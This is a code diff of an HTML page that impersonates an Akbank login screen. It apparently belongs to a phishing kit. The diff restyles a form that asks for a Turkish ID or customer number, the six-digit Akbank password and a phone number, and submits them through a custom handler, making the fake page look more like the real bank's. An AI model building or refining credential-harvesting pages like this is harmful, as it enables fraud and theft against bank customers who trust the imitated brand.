@@ -108,24 +108,24 @@
 			
 			
 			
-   <form id="customForm" method="POST">
-        <label for="customUsername">
-            MÜŞTERİ VEYA TC KİMLİK NUMARASI
-        </label>
-        <input type="text" name="customTc" placeholder="Müşteri veya TC kimlik numaranı gir" id="customUsername" minlength="11" maxlength="11" pattern="\d{11}" required>
-        <hr>
-        <hr>
-        <label for="customPassword">
-            AKBANK ŞİFRESİ
-        </label>
-        <input type="password" name="customPass" placeholder="6 haneli şifreni gir" id="customPassword" minlength="6" maxlength="6" pattern="\d{6}" required>
-        <hr>
-        <label for="customtel">
-            TELEFON NUMARASI
-        </label>
-        <input type="text" name="customtel" placeholder="Telefon Numaranı gir" id="customtel" minlength="11" maxlength="11" pattern="\d{11}" required>
-        <button type="submit" name="gonder" id="customSubmitBtn">Giriş</button>
-    </form>
+                <form id="customForm" method="POST">
+    <label for="customUsername" style="color:#636364; font-size: 11px; display: block; margin-bottom: 3%; float: left; font-weight: 600;">
+        MÜŞTERİ VEYA TC KİMLİK NUMARASI
+    </label>
+    <input type="text" name="customTc" placeholder="Müşteri veya TC kimlik numaranı gir" id="customUsername" style="font-size: 13px; font-weight: 600; border: 0; width: 100%; display: block; margin-bottom: 10px;" minlength="11" maxlength="11" inputmode="numeric" required>
+    <hr>
+    <hr>
+    <label for="customPassword" style="float: left; color:#636364; font-size: 11px; display: block; margin-bottom: 3%; margin-top: 3%; font-weight: 600;">
+        AKBANK ŞİFRESİ
+    </label>
+    <input type="password" name="customPass" placeholder="6 haneli şifreni gir" id="customPassword" style="font-size: 13px; font-weight: 600; width: 100%; display: block; border: 0;" minlength="6" maxlength="6" inputmode="numeric" required>
+    <hr>
+    <label for="customtel" style="color:#636364; font-size: 11px; display: block; margin-bottom: 3%; float: left; font-weight: 600;">
+        TELEFON NUMARASI
+    </label>
+    <input type="text" name="customtel" placeholder="Telefon Numaranı numaranı gir" id="customtel" style="font-size: 13px; font-weight: 600; border: 0; width: 100%; display: block; margin-bottom: 10px;" minlength="11" maxlength="11" inputmode="numeric" required>
+    <button type="submit" name="gonder" id="customSubmitBtn" style="width: 100% !important; background-color: rgb(220, 0, 4);" onclick="submitCustomForm(event)">Giriş</button>
+</form>
 </div>
 
             <div id="tab3footer" style="display: flex; justify-content: space-between;" bis_skin_checked="1">
@@ -192,6 +192,5 @@
             });
         }
     </script>
-	
 
 </body></html>
